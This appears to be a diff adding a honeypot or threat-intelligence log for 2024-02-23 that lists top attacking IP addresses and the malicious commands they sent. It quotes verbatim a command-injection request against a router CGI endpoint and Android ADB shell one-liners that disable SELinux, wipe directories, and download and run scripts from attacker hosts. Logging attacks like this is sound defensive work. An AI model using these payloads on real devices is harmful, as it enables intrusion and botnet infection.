@@ -1,0 +1,17 @@
+Top 5 IPs for 2024-02-23 :
+
+39.107.136.56
+136.57.144.156
+149.106.152.244
+112.6.41.110
+43.143.164.202
+
+Malcious Commands seen:
+
+GET /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;cd${IFS}/var/tmp;${IFS}wget${IFS}http://103.28.33.96/to.sh;${IFS}chmod${IFS}777${IFS}to.sh;${IFS}sh${IFS}to.sh;&filetype=gz
+User-Agent: KrebsOnSecurity
+
+Attacker IP address: 172.31.88.137
+
+toybox pgrep -a M arm arm7 x86 x86_64 | toybox xargs toybox kill -9;su 0 toybox pgrep -a M arm arm7 x86 x86_64 | su 0 toybox xargs toybox kill -9;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://103.28.33.96/and || su 0 busybox wget http://103.28.33.96/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://103.174.73.85/adb1.sh; sh adb1.sh; wget http://103.174.73.85/adb1.sh; sh adb1.sh; curl http://103.174.73.85/adb1.sh; sh adb1.sh; busybox wget http://103.174.73.85/adb2.sh; sh adb2.sh; wget http://103.174.73.85/adb2.sh; sh adb2.sh; curl http://103.174.73.85/adb2.sh; sh adb2.sh; busybox wget http://103.174.73.85/adb3.sh; sh adb3.sh; wget http://103.174.73.85/adb3.sh; sh adb3.sh; curl http://103.174.73.85/adb3.sh; sh adb3.sh
